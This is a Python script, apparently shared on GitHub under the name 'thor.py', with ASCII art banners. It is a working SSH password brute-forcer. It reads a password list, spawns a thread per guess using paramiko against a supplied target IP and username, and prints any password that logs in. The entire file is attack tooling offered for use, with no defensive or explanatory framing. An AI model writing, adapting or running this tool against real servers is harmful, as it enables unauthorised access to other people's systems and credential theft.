#By SxNade
#https://github.com/SxNade
#CONTRIBUTE

import paramiko
import os
import sys
import socket
import threading, time
from termcolor import colored
#importing the required libraries

stop_flag = 0
#setting the initial value to 0

hammer = '''
 -------
/ SxNade|
\       /
 ---||--
    ||
    ||
    ||
    ||
    ...`
     '''

logo = '''

    .....                                               
 .H8888888h.  ~-.    .uef^"                             
 888888888888x  `> :d88E              u.      .u    .   
X~     `?888888hx~ `888E        ...ue888b   .d88B :@8c  
'      x8.^"*88*"   888E .z8k   888R Y888r ="8888f8888r 
 `-:- X8888x        888E~?888L  888R I888>   4888>'88"  
      488888>       888E  888E  888R I888>   4888> '    
    .. `"88*        888E  888E  888R I888>   4888>      
  x88888nX"      .  888E  888E u8888cJ888   .d888L .+   
 !"*8888888n..  :   888E  888E  "*888*P"    ^"8888*"    
'    "*88888888*   m888N= 888>    'Y"          "Y"      
        ^"***"`     `Y"   888                           
                         J88"                           
                         @%                             
                       :"                               
                            *By SxNade https://github.com/SxNade
'''
print(logo)

if len(sys.argv) != 4:
  print("[*]usage python3 thor.py <ip> <username> <password-file>")
  sys.exit(0)

target_ip = sys.argv[1]
username = sys.argv[2]
password_file = sys.argv[3]
#Grabing the required variables....

#Defning A SSH connect Function to start SSH session Against Target...
def ssh_connect(password, code=0):
  global stop_flag
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#checking for each correct password in List 
  try:
    ssh.connect(target_ip, port=22, username=username, password=password)
    stop_flag = 1
    print(colored(f"\n[+]SSH Password For {username} found :> {password}    {hammer}\n", "green", attrs=['bold']))
  except:
    print(colored(f"[!]Incorrect SSH password:> {password}", 'red'))
  ssh.close()

  ssh.close()
  return code

#Checking that if the specified password File exists
if os.path.exists(password_file) == False:
  print(colored("[!] File Not Found", 'red'))
  sys.exit(1)

#Reading For Passwords From the Specified password File..!
with open(password_file, 'r') as file:
  for line in file.readlines():
    if stop_flag == 1:
      t.join()
      #Joining the Threads in-case we found a correct password..
      exit()
    password = line.strip()
    t = threading.Thread(target=ssh_connect, args=(password,))
    t.start()
    #starting threading on ssh_connect function which takes only one argument of password...
    time.sleep(0.5)
    #time in seconds between each successive thread//Don't change it unless very neccessary...!

